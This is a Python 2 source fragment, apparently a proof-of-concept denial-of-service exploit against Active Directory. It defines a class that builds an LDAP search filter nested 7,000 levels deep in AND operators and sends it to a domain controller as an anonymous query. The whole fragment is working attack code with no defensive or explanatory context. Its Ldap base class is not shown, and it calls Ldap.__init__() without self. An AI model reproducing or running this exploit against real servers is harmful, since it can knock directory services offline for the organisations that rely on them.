class ActiveDirectoryDOS( Ldap ):

    def __init__(self):
        self._s = None
        self.host = '192.168.0.1'
        self.basedn = 'dc=bugweek,dc=corelabs,dc=core-sdi,dc=com'
        self.port = 389
        self.buffer = ''
        self.msg_id = 1
        Ldap.__init__()

    def generateFilter_BinaryOp( self, filter ):
        filterBuffer = asn1.OCTETSTRING(filter[1]).encode() + asn1.OCTETSTRING(filter[2]).encode()
        filterBuffer = self.encapsulateHeader( filter[0], filterBuffer )
        return filterBuffer        
    
    def generateFilter_RecursiveBinaryOp( self, filter, numTimes):
        simpleBinOp = self.generateFilter_BinaryOp( filter )
        filterBuffer = simpleBinOp
        for cnt in range( 0, numTimes ):
            filterBuffer = self.encapsulateHeader( self.LDAP_FILTER_AND, filterBuffer + simpleBinOp )
        return filterBuffer


    def searchSub( self, filterBuffer ):

        self.bindRequest()
        self.searchRequest( filterBuffer )

    def run(self, host = '', basedn = '', name = '' ):
        
        # the machine must not exist
        machine_name = 'xaxax'
        
        filterComputerNotInDir = (Ldap.LDAP_FILTER_EQUALITY,'name',machine_name)

        # execute the anonymous query
        print 'executing query'
        filterBuffer = self.generateFilter_RecursiveBinaryOp( filterComputerNotInDir, 7000 )
        self.searchSub( filterBuffer )
